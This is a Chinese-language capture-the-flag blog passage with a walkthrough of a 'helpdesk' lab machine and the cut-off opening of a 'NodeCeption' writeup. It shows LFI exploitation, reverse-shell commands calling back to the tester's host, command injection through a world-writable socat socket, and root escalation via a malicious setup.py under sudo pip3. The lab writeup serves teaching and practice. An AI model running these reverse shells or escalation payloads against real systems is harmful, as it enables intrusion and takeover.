class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.72 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak,md,db,js<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.72<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,txt,html,bak,md,db,js<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.html                (Status: 403) [Size: 199]<br>/index.php            (Status: 200) [Size: 1290]<br>/.php                 (Status: 403) [Size: 199]<br>/login.php            (Status: 200) [Size: 1819]<br>/javascript           (Status: 301) [Size: 239] [--&gt; http://192.168.2.72/javascript/]<br>/helpdesk             (Status: 301) [Size: 237] [--&gt; http://192.168.2.72/helpdesk/]<br>/ticket.php           (Status: 200) [Size: 204]<br>/panel.php            (Status: 302) [Size: 0] [--&gt; login.php]<br>/debug.php            (Status: 200) [Size: 250]<br>/.html                (Status: 403) [Size: 199]<br>/.php                 (Status: 403) [Size: 199]<br>/server-status        (Status: 403) [Size: 199]<br>Progress: 837137 / 1764488 (47.44%)^C<br>[!] Keyboard interrupt detected, terminating.<br>Progress: 838967 / 1764488 (47.55%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>扫描找到几个目录：<code>/ticket.php</code>、<code>/panel.php </code>、<code>/debug.php </code><br>访问<code>/debug.php</code>发现一组用户凭证，但经过尝试无法进行利用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# curl http://192.168.2.72/debug.php<br>&lt;style&gt;<br>body &#123; font-family: monospace; background: <span class="hljs-comment">#111; color: #0f0; padding: 20px; &#125;</span><br>h2 &#123; color: <span class="hljs-comment">#0ff; &#125;</span><br>&lt;/style&gt;&lt;h2&gt;Debug Mode Enabled&lt;/h2&gt;&lt;pre&gt;[DEBUG] Connecting to internal dev server...<br>[DEBUG] Using creds: service_user:SuperSecretDev123!&lt;/pre&gt;    <br></code></pre></td></tr></table></figure><h1 id="二、漏洞利用"><a href="#二、漏洞利用" class="headerlink" title="二、漏洞利用"></a>二、漏洞利用</h1><h2 id="1、文件包含-LFI"><a href="#1、文件包含-LFI" class="headerlink" title="1、文件包含-LFI"></a>1、文件包含-LFI</h2><p><code>ticket.php</code> 页面看起来像一个票据查看器，尝试使用 <code>ffuf</code> 对其参数进行模糊测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# ffuf -u <span class="hljs-string">&quot;http://192.168.2.72/ticket.php?FUZZ=id&quot;</span> -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  --fw 24<br>....<br>url                     [Status: 200, Size: 271, Words: 30, Lines: 5, Duration: 1ms]<br>:: Progress: [220559/220559] :: Job [1/1] :: 3448 req/sec :: Duration: [0:01:25] :: Errors: 0 ::<br></code></pre></td></tr></table></figure><p>找到一个<code>url</code>参数，通过参数可以读取<code>/login.php</code>文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# curl http://192.168.2.72/ticket.php?url=login.php<br>&lt;style&gt;<br>body &#123; font-family: sans-serif; background: <span class="hljs-comment">#f0f0f0; padding: 20px; &#125;</span><br>pre &#123; background: <span class="hljs-comment">#fff; padding: 10px; border-left: 4px solid #4A90E2; &#125;</span><br>h1 &#123; color: <span class="hljs-comment">#4A90E2; &#125;</span><br>&lt;/style&gt;&lt;h1&gt;Ticket Viewer&lt;/h1&gt;&lt;h1&gt;Ticket Viewer&lt;/h1&gt;&lt;pre&gt;&lt;?php<br>session_start();<br><br>// Enable PHP error display <span class="hljs-keyword">for</span> debugging (remove <span class="hljs-keyword">in</span> production)<br>ini_set(<span class="hljs-string">&#x27;display_errors&#x27;</span>, 1);<br>error_reporting(E_ALL);<br><br>// Stored credentials<br><span class="hljs-variable">$stored_user</span> = <span class="hljs-string">&#x27;helpdesk&#x27;</span>;<br><br>// SHA-512 <span class="hljs-built_in">hash</span> <span class="hljs-keyword">for</span> password: ticketmaster<br><span class="hljs-variable">$stored_hash</span> = <span class="hljs-string">&#x27;$6$ABC123$fLo2MacCV.XBQeRZtHWL2297q/fUBs/b8gOmvLGuiz7wDgl3MSWcOOSKnTbaNPoUMCmEpY1dlwuPKbAtIuoo6.&#x27;</span>;<br></code></pre></td></tr></table></figure><p>同时找到一组凭证：<code>helpdesk:ticketmaster</code>，使用该组凭证成功登录到web后台</p><h1 id="三、获取www权限"><a href="#三、获取www权限" class="headerlink" title="三、获取www权限"></a>三、获取www权限</h1><p>进入web后台，发现是一个远程命令执行的面板<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509041012692.png"></p><p>尝试执行<code>id</code>，发现成功返回，证明可以反弹shell<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509041012720.png"></p><p>执行反弹shell命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">busybox nc 192.168.2.4 4444 -e /bin/bash<br></code></pre></td></tr></table></figure><p>在Kali上监听4444端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nc -lvnp 4444       <br>listening on [any] 4444 ...<br></code></pre></td></tr></table></figure><p>成功获取到<code>www-data</code>用户的权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nc -lvnp 4444       <br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.72] 45116<br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br></code></pre></td></tr></table></figure><p>建立稳定的shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">script /dev/null -c bash<br>Ctrl+Z<br><span class="hljs-built_in">stty</span> raw -<span class="hljs-built_in">echo</span>; <span class="hljs-built_in">fg</span><br>reset xterm<br><span class="hljs-built_in">export</span> TERM=xterm<br><span class="hljs-built_in">export</span> SHELL=/bin/bash<br><span class="hljs-built_in">stty</span> rows 36 columns 178<br></code></pre></td></tr></table></figure><h1 id="四、权限提升"><a href="#四、权限提升" class="headerlink" title="四、权限提升"></a>四、权限提升</h1><h2 id="1、获取helpdesk权限"><a href="#1、获取helpdesk权限" class="headerlink" title="1、获取helpdesk权限"></a>1、获取helpdesk权限</h2><p>在 <code>/opt/helpdesk-socket/</code> 目录下发现了一个可利用的Unix套接字</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@helpdesk:/opt/helpdesk-socket$ <span class="hljs-built_in">ls</span> -la<br>total 16<br>drwxr-xr-x 2 helpdesk helpdesk 4096 Sep  3 11:43 .<br>drwxr-xr-x 4 root     root     4096 Aug 16 15:32 ..<br>-rwxr-xr-x 1 helpdesk helpdesk  158 Aug 16 15:32 handler.sh<br>srwxrwxrwx 1 helpdesk helpdesk    0 Sep  3 11:43 helpdesk.sock<br>-rw-r--r-- 1 root     root      184 Aug 16 15:44 serve.sh<br></code></pre></td></tr></table></figure><p>查看 <code>handler.sh</code> 和 <code>serve.sh</code> 脚本内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@helpdesk:/opt/helpdesk-socket$ <span class="hljs-built_in">cat</span> handler.sh <br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-comment"># Simple parser — executes anything sent over the socket (dangerous!)</span><br><span class="hljs-built_in">read</span> cmd<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[HelpDesk Automation] Executing: <span class="hljs-variable">$cmd</span>&quot;</span><br>/bin/bash -c <span class="hljs-string">&quot;<span class="hljs-variable">$cmd</span>&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@helpdesk:/opt/helpdesk-socket$ <span class="hljs-built_in">cat</span> serve.sh   <br><span class="hljs-comment">#!/bin/bash</span><br><br>SOCKET=<span class="hljs-string">&quot;/opt/helpdesk-socket/helpdesk.sock&quot;</span><br><br>[ -e <span class="hljs-string">&quot;<span class="hljs-variable">$SOCKET</span>&quot;</span> ] &amp;&amp; <span class="hljs-built_in">rm</span> <span class="hljs-string">&quot;<span class="hljs-variable">$SOCKET</span>&quot;</span><br><br>/usr/bin/socat -d -d UNIX-LISTEN:<span class="hljs-variable">$SOCKET</span>,fork,mode=777 EXEC:/opt/helpdesk-socket/handler.sh<br></code></pre></td></tr></table></figure><p><strong>知识点补充：socat 与 UNIX Socket</strong></p><ul><li><strong>socat</strong>：是一个强大的网络工具，堪称netcat的增强版。 它的核心功能是在两个数据流之间建立一个双向通道。 这些数据流可以是文件、管道、设备、TCP&#x2F;UDP套接字，甚至是执行的程序。</li><li><strong>UNIX Socket</strong>：这是一种在同一台机器上的进程间通信（IPC）机制。 它不经过网络协议栈，而是通过文件系统进行通信，因此效率更高。</li></ul><p> <strong>漏洞分析</strong>：<code>serve.sh</code> 脚本以 <code>helpdesk</code> 用户身份运行，并使用 <code>socat</code> 创建了一个名为 <code>helpdesk.sock</code> 的UNIX套接字。 关键在于 <code>mode=777</code> 参数，它使得任何用户都对这个socket文件有读、写、执行权限。当有数据发送到这个socket时，<code>EXEC:/opt/helpdesk-socket/handler.sh</code> 会被触发，<code>handler.sh</code> 会将接收到的数据作为命令直接用 <code>/bin/bash -c</code> 执行。</p><p>利用这个漏洞，将一个反弹shell的命令通过 <code>socat</code> 发送到 <code>helpdesk.sock</code>，从而以 <code>helpdesk</code> 用户权限执行。</p><p>在Kali上重新监听4444端口，然后在 <code>www-data</code> shell中执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@helpdesk:/opt/helpdesk-socket$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.2.4/4444 0&gt;&amp;1&quot;</span> | socat - /opt/helpdesk-socket/helpdesk.sock<br></code></pre></td></tr></table></figure><p>成功获取到<code>helpdesk</code>用户权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nc -lvnp 4444       <br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.72] 46062<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (700): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>helpdesk@helpdesk:/$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=1001(helpdesk) gid=1001(helpdesk) <span class="hljs-built_in">groups</span>=1001(helpdesk)<br></code></pre></td></tr></table></figure><h2 id="2、获取root权限"><a href="#2、获取root权限" class="headerlink" title="2、获取root权限"></a>2、获取root权限</h2><p>使用 <code>sudo -l</code> 查看 <code>helpdesk</code> 用户的sudo权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">helpdesk@helpdesk:/$ <span class="hljs-built_in">sudo</span> -l<br><span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> helpdesk on helpdesk:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,<br>    use_pty<br><br>User helpdesk may run the following commands on helpdesk:<br>    (ALL) NOPASSWD: /usr/bin/pip3 install --break-system-packages *<br></code></pre></td></tr></table></figure><p>发现 <code>helpdesk</code> 用户可以免密以root权限执行 <code>pip3 install</code> 命令。这是一个已知的提权向量。 当<code>pip install</code>安装一个本地目录时，它会执行该目录下的<code>setup.py</code>文件。 因此，我们可以创建一个恶意的<code>setup.py</code>文件，在其中包含提权命令。</p><p>创建一个包含提权payload的 <code>setup.py</code> 文件，该payload会给 <code>/bin/bash</code> 添加SUID权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">helpdesk@helpdesk:~$ <span class="hljs-built_in">mkdir</span> 1;<span class="hljs-built_in">cd</span> 1<br>helpdesk@helpdesk:~/1$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;import os; os.system(&quot;chmod +s /bin/bash&quot;)&#x27;</span> &gt; setup.py<br><br>helpdesk@helpdesk:~/1$ <span class="hljs-built_in">ls</span> -la /bin/bash<br><span class="hljs-built_in">ls</span> -la /bin/bash<br>-rwxr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash<br></code></pre></td></tr></table></figure><p>使用 <code>sudo</code> 执行 <code>pip3 install</code> 来安装当前目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">helpdesk@helpdesk:~/1$ <span class="hljs-built_in">sudo</span> /usr/bin/pip3 install --break-system-packages .<br>Processing /home/helpdesk/1<br>  Preparing metadata (setup.py): started<br>  Preparing metadata (setup.py): finished with status <span class="hljs-string">&#x27;done&#x27;</span><br>ERROR: No .egg-info directory found <span class="hljs-keyword">in</span> /tmp/pip-pip-egg-info-6_8hwue4<br><br>helpdesk@helpdesk:~/1$ <span class="hljs-built_in">ls</span> -la /bin/bash<br>-rwsr-sr-x 1 root root 1446024 Mar 31  2024 /bin/bash<br></code></pre></td></tr></table></figure><p>可以看到 <code>/bin/bash</code> 已经成功被设置了SUID位。现在，执行 <code>bash -p</code> 即可获得root权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">helpdesk@helpdesk:~/1$ bash -p<br><span class="hljs-built_in">id</span><br>uid=1001(helpdesk) gid=1001(helpdesk) euid=0(root) egid=0(root) <span class="hljs-built_in">groups</span>=0(root),1001(helpdesk)<br></code></pre></td></tr></table></figure><h1 id="五、获取FLAG"><a href="#五、获取FLAG" class="headerlink" title="五、获取FLAG"></a>五、获取FLAG</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /home/helpdesk/user.txt /root/root.txt<br>flag&#123;ticket_approved_by_thedesk&#125;<br>flag&#123;request_has_been_escalated&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hackmyvm</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件包含</tag>
      
      <tag>socat</tag>
      
      <tag>提权-pip install</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NodeCeption</title>
    <link href="/Thehackerslabs/NodeCeption/"/>
    <url>/Thehackerslabs/NodeCeption/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul><li><a href="https://labs.thehackerslabs.com/machine/118">https://labs.thehackerslabs.com/machine/118</a></li></ul><h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap -sn 192.168.2.0/24                <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-21 23:06 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.0011s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.0011s latency).<br>MAC Address: 08:00:27:F5:5B:8F (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.70<br>Host is up (0.0031s latency).<br>MAC Address: 08:00:27:32:DB:77 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.09 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.70</code></p><h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap --min-rate 10000 -p- 192.168.2.70                   <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-21 23:06 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.70<br>Host is up (0.00090s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>5678/tcp open  rrac<br>8765/tcp open  ultraseek-http<br>MAC Address: 08:00:27:32:DB:77 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 6.37 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22,5678,8765</code></p><h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,5678,8765 192.168.2.70<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-21 23:07 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.70<br>Host is up (0.00081s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   256 67:<span class="hljs-built_in">df</span>:2b:e6:48:16:ec:91:b1:a6:67:25:37:05:<span class="hljs-built_in">fc</span>:0f (ECDSA)<br>|_  256 dc:ab:74:b7:be:b5:49:6a:c8:7b:db:6b:7c:91:73:69 (ED25519)<br>5678/tcp open  rrac?<br>| fingerprint-strings: <br>|   GetRequest: <br>|     HTTP/1.1 200 OK<br>|     Accept-Ranges: bytes<br>|     Cache-Control: public, max-age=86400<br>|     Last-Modified: Thu, 21 Aug 2025 14:19:26 GMT<br>|     ETag: W/<span class="hljs-string">&quot;7b7-198ccffb4db&quot;</span><br>|     Content-Type: text/html; charset=utf-8<br>|     Content-Length: 1975<br>|     Vary: Accept-Encoding<br>|     Date: Thu, 21 Aug 2025 15:07:44 GMT<br>|     Connection: close<br>|     &lt;!DOCTYPE html&gt;<br>|     &lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br>|     &lt;<span class="hljs-built_in">head</span>&gt;<br>|     &lt;script <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;module&quot;</span> crossorigin src=<span class="hljs-string">&quot;/assets/polyfills-B8p9DdqU.js&quot;</span>&gt;&lt;/script&gt;<br>|     &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span> /&gt;<br>|     &lt;meta http-equiv=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> content=<span class="hljs-string">&quot;IE=edge&quot;</span> /&gt;<br>|     &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width,initial-scale=1.0&quot;</span> /&gt;<br>|     &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;icon&quot;</span> href=<span class="hljs-string">&quot;/favicon.ico&quot;</span> /&gt;<br>|     &lt;style&gt;@media (prefers-color-scheme: dark) &#123; body &#123; background-color: rgb(45, 46, 46) &#125; &#125;&lt;/style&gt;<br>|     &lt;script <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>|     window.BASE_PATH = <span class="hljs-string">&#x27;/&#x27;</span>;<br>|     window.REST_ENDPOINT = <span class="hljs-string">&#x27;rest&#x27;</span>;<br>|     &lt;/script&gt;<br>|     &lt;script src=<span class="hljs-string">&quot;/rest/sentry.js&quot;</span>&gt;&lt;/script&gt;<br>|     &lt;script&gt;!<span class="hljs-keyword">function</span>(t,e)&#123;var o,n,<br>|   HTTPOptions: <br>|     HTTP/1.1 404 Not Found<br>|     Content-Security-Policy: default-src <span class="hljs-string">&#x27;none&#x27;</span><br>|     X-Content-Type-Options: nosniff<br>|     Content-Type: text/html; charset=utf-8<br>|     Content-Length: 143<br>|     Vary: Accept-Encoding<br>|     Date: Thu, 21 Aug 2025 15:07:44 GMT<br>|     Connection: close<br>|     &lt;!DOCTYPE html&gt;<br>|     &lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br>|     &lt;<span class="hljs-built_in">head</span>&gt;<br>|     &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>|     &lt;title&gt;Error&lt;/title&gt;<br>|     &lt;/head&gt;<br>|     &lt;body&gt;<br>|     &lt;pre&gt;Cannot OPTIONS /&lt;/pre&gt;<br>|     &lt;/body&gt;<br>|     &lt;/html&gt;<br>|   RTSPRequest: <br>|     HTTP/1.1 404 Not Found<br>|     Content-Security-Policy: default-src <span class="hljs-string">&#x27;none&#x27;</span><br>|     X-Content-Type-Options: nosniff<br>|     Content-Type: text/html; charset=utf-8<br>|     Content-Length: 143<br>|     Vary: Accept-Encoding<br>|     Date: Thu, 21 Aug 2025 15:07:45 GMT<br>|     Connection: close<br>|     &lt;!DOCTYPE html&gt;<br>|     &lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br>|     &lt;<span class="hljs-built_in">head</span>&gt;<br>|     &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>|     &lt;title&gt;Error&lt;/title&gt;<br>|     &lt;/head&gt;<br>|_    &lt;/html&gt;<br>8765/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))<br>|_http-title: Apache2 Ubuntu Default Page: It works<br>|_http-server-header: Apache/2.4.58 (Ubuntu)<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>SF-Port5678-TCP:V=7.94SVN%I=7%D=8/21%Time=68A73641%P=x86_64-pc-linux-gnu%r<br>SF:(GetRequest,8DC,<span class="hljs-string">&quot;HTTP/1\.1\x20200\x20OK\r\nAccept-Ranges:\x20bytes\r\nC</span><br><span class="hljs-string">SF:ache-Control:\x20public,\x20max-age=86400\r\nLast-Modified:\x20Thu,\x20</span><br><span class="hljs-string">SF:21\x20Aug\x202025\x2014:19:26\x20GMT\r\nETag:\x20W/\&quot;7b7-198ccffb4db\&quot;\</span><br><span 